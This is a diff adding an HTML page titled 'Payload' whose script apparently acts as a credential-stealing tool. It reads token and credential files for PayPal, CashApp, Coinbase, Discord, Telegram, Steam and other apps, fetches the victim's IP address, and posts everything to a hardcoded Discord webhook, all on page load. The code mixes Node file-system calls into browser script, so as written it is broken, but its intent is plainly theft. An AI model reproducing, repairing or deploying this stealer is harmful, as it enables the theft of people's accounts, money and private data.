@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Payload</title>
+</head>
+<body>
+    <script>
+        // List of applications and their token locations
+        const apps = {
+            "PayPal": ["~/.config/PayPal/credentials.json"],
+            "CashApp": ["~/.config/CashApp/credentials.json"],
+            "Coinbase": ["~/.config/Coinbase/credentials.json"],
+            "Roblox": ["~/.config/Roblox/credentials.json"],
+            "Discord": ["~/.config/discord/settings.json", "~/.config/discord/Local Storage/https_discord.com_0.localstorage"],
+            "Telegram": ["~/.config/Telegram/tdata"],
+            "Instagram": ["~/.config/instagram/credentials.json"],
+            "Steam": ["~/.steam/steam.cfg"],
+            "Snapchat": ["~/.config/Snapchat/credentials.json"]
+        };
+
+        // Function to read tokens
+        function readTokens(app) {
+            const tokens = [];
+            for (const path of apps[app]) {
+                const fullPath = path.replace("~", process.env.HOME);
+                if (fs.existsSync(fullPath)) {
+                    tokens.push(fs.readFileSync(fullPath, 'utf-8'));
+                }
+            }
+            return tokens;
+        }
+
+        // Read IP address
+        async function getIPAddress() {
+            const response = await fetch('https://api.ipify.org');
+            return await response.text();
+        }
+
+        // Discord webhook URL
+        const webhookUrl = "https://discord.com/api/webhooks/1388760353772535930/pnZFz1Prz8k7n0K861P_87Jlc__lNawsrYe1YpFCXItj-pwbOLcHU9ggPAgNKxe4Zzle";
+
+        // Collect all data
+        async function collectData() {
+            const ipAddress = await getIPAddress();
+            const data = {
+                "IP Address": ipAddress,
+                "Tokens": {}
+            };
+
+            for (const app in apps) {
+                data["Tokens"][app] = readTokens(app);
+            }
+
+            return data;
+        }
+
+        // Send data to Discord webhook
+        async function sendData(data) {
+            const response = await fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            });
+            console.log(response.status, await response.text());
+        }
+
+        // Execute the data collection and sending process
+        (async () => {
+            const data = await collectData();
+            await sendData(data);
+        })();
+    </script>
+</body>
+</html>
